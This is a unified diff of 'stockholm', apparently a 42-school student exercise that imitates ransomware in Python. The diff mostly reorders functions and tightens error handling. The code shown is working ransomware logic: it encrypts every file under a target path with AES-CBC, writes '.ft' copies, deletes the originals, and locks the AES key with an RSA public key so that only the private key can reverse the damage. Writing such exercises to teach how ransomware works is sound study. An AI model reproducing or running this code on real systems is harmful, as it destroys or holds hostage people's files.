@@ -6,7 +6,7 @@
 #    By: guferrei <guferrei@student.42sp.org.br>    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2025/02/14 21:33:17 by guferrei          #+#    #+#              #
-#    Updated: 2025/02/24 15:55:11 by guferrei         ###   ########.fr        #
+#    Updated: 2025/02/24 16:08:01 by guferrei         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -32,10 +32,8 @@ def program_args():
 	group.add_argument('-s', '--silent', action="store_true", help="run the program in silent mode")
 	return parser.parse_args()
 
-
 def print_version():
 	print("stockholm 1.0.0")
-
 
 def get_files(filter):
 	file_list = []
@@ -44,43 +42,15 @@ def get_files(filter):
 			file_list.append(file)
 	return file_list
 
-
 def load_file_content(file):
 	with open(file, 'rb') as f:
 		data = f.read()
 		return data
 
-
 def pad(data):
 	padding_length = 16 - len(data) % 16
 	padding = bytes([padding_length] * padding_length)
 	return data + padding
-
-def encrypt_key(public_key, aes_key):
-	ciphertext = public_key.encrypt(
-			aes_key,
-			padding.OAEP(
-				mgf=padding.MGF1(algorithm=hashes.SHA256()),
-				algorithm=hashes.SHA256(),
-				label=None
-			)
-		)
-	with open(PATH + "/key.pem", 'wb') as f:
-		f.write(ciphertext)
-
-
-def encrypt_file(file, key, iv, args):
-	if not args.silent:
-		print("ecrypting file {}...".format(file))
-	plaintext = load_file_content(file)
-	padded_plaintext = pad(plaintext)
-	cipher = AES.new(key, AES.MODE_CBC, iv)
- 
-	ciphertext = cipher.encrypt(padded_plaintext)
-	with open(file+'.ft', 'wb') as f:
-		f.write(iv + ciphertext)
-	os.remove(file)
-
 
 def unpad(data):
 	padding_length = data[-1]
@@ -88,6 +58,18 @@ def unpad(data):
 		raise ValueError("Invalid padding encountered")
 	return data[:-padding_length]
 
+def encrypt_key(public_key, aes_key):
+	ciphertext = public_key.encrypt(
+			aes_key,
+			padding.OAEP(
+				mgf=padding.MGF1(
+				algorithm=hashes.SHA256()),
+				algorithm=hashes.SHA256(),
+				label=None
+			)
+		)
+	with open(PATH + "/key.pem", 'wb') as f:
+		f.write(ciphertext)
 
 def decrypt_key(private_key):
 	ciphertext = load_file_content(PATH + "/key.pem")
@@ -96,7 +78,8 @@ def decrypt_key(private_key):
 			plaintext = private_key.decrypt(
 				ciphertext,
 				padding.OAEP(
-					mgf=padding.MGF1(algorithm=hashes.SHA256()),
+					mgf=padding.MGF1(
+					algorithm=hashes.SHA256()),
 					algorithm=hashes.SHA256(),
 					label=None
 				)
@@ -105,40 +88,31 @@ def decrypt_key(private_key):
 		except:
 			raise Exception
 
+def encrypt_file(file, key, iv, args):
+	if not args.silent:
+		print("ecrypting file {}...".format(file))
+
+	plaintext = load_file_content(file)
+	padded_plaintext = pad(plaintext)
+	cipher = AES.new(key, AES.MODE_CBC, iv)
+	ciphertext = cipher.encrypt(padded_plaintext)
+
+	with open(file+'.ft', 'wb') as f:
+		f.write(iv + ciphertext)
+	os.remove(file)
 
 def decrypt_file(file, key):
 	with open(file, 'rb') as f:
 		iv = f.read(16)
 		ciphertext = f.read()
+
 	cipher = AES.new(key, AES.MODE_CBC, iv)
 	plaintext = cipher.decrypt(ciphertext)
 	decrypted_data = unpad(plaintext)
+
 	with open(file.removesuffix('.ft'), 'wb') as f:
 		f.write(decrypted_data)
 	os.remove(file)
-
-
-def reverse(key: str, args):
-	file_list = get_files("/**/*.ft")
-	try:
-		private_key = serialization.load_pem_private_key(key.encode(), password=None)
-	except:
-		print("Private key is invalid. Decryption failed!!")
-		return
-
-
-	for file in file_list:
-		try:
-			key = decrypt_key(private_key)
-			decrypt_file(file, key)
-		except:
-			if not args.silent:
-				print("File Decryption Failed! This is not the right private key")
-			return
-	if not args.silent:
-		print("Decryption Successful")
-	os.remove(PATH + "/key.pem")
-
 
 def run(args):
 	file_list = get_files("/**/*")
@@ -163,6 +137,32 @@ def run(args):
 	if not args.silent:
 		print("Encryption Successful")
 
+def reverse(key: str, args):
+	file_list = get_files("/**/*.ft")
+	try:
+		private_key = serialization.load_pem_private_key(key.encode(), password=None)
+	except:
+		print("Private key is invalid. Decryption failed!!")
+		return
+
+	try:
+		key = decrypt_key(private_key)
+	except:
+		if not args.silent:
+			print("Key Decryption Failed! This is not the right private key")
+		return
+
+	for file in file_list:
+		try:
+			decrypt_file(file, key)
+		except:
+			if not args.silent:
+				print("File Decryption Failed! This is not the right AES key")
+			return
+	if os.path.exists(PATH + "/key.pem"):
+		os.remove(PATH + "/key.pem")
+	if not args.silent:
+		print("Decryption Successful")
 
 def main():
 	args = program_args()
@@ -172,7 +172,6 @@ def main():
 		reverse(args.reverse, args)
 		return
 	run(args)
-
 
 if __name__ == '__main__':
 	main()
